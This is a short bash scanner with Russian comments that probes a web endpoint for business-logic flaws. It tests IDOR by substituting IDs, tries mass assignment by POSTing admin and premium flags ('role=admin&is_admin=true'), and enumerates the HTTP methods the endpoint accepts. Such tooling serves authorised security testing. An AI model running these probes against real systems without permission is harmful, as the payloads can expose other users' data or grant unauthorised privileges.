#!/bin/bash
# Context Analyzer — понимает бизнес-логику
# Сравнивает ответы с разными параметрами

TARGET=$1
ENDPOINT=$2
[ -z "$ENDPOINT" ] && echo "Usage: $0 <BASE_URL> <ENDPOINT>" && exit 1

echo "[CONTEXT] Анализирую бизнес-логику $ENDPOINT..."

# Тест 1: Подмена ID (IDOR)
echo "[CONTEXT] Тест IDOR..."
ORIG=$(curl -sk "$TARGET$ENDPOINT" 2>/dev/null | wc -c)

# Пробуем соседние ID
for id in 0 1 2 100 999; do
    TEST_URL="${TARGET}${ENDPOINT//[0-9]*/$id}"
    RESP=$(curl -sk -o /dev/null -w "%{http_code} %{size_download}" "$TEST_URL" 2>/dev/null)
    CODE=$(echo "$RESP" | cut -d' ' -f1)
    SIZE=$(echo "$RESP" | cut -d' ' -f2)
    
    # Если ответ 200 и размер похож на оригинал — возможен IDOR
    if [ "$CODE" = "200" ] && [ "$SIZE" -gt 100 ]; then
        DIFF=$((SIZE - ORIG))
        [ ${DIFF#-} -lt 500 ] && echo "  🔴 IDOR possible: $TEST_URL (size: $SIZE, orig: $ORIG)"
    fi
done

# Тест 2: Mass Assignment
echo "[CONTEXT] Тест Mass Assignment..."
MAS_URL="${TARGET}${ENDPOINT}"
MAS_BODY="role=admin&is_admin=true&premium=true&verified=true"
MAS_RESP=$(curl -sk -X POST -d "$MAS_BODY" -w "%{http_code}" "$MAS_URL" 2>/dev/null)
if [ "$MAS_RESP" = "200" ] || [ "$MAS_RESP" = "201" ]; then
    echo "  🔴 Mass Assignment possible: $MAS_URL (HTTP $MAS_RESP)"
fi

# Тест 3: Проверка разных HTTP методов
echo "[CONTEXT] Тест HTTP методов..."
for method in GET POST PUT DELETE PATCH OPTIONS; do
    CODE=$(curl -sk -X "$method" -o /dev/null -w "%{http_code}" "$TARGET$ENDPOINT" 2>/dev/null)
    [ "$CODE" != "405" ] && [ "$CODE" != "404" ] && echo "  🟡 $method → HTTP $CODE"
done

echo "[CONTEXT] Анализ завершён"
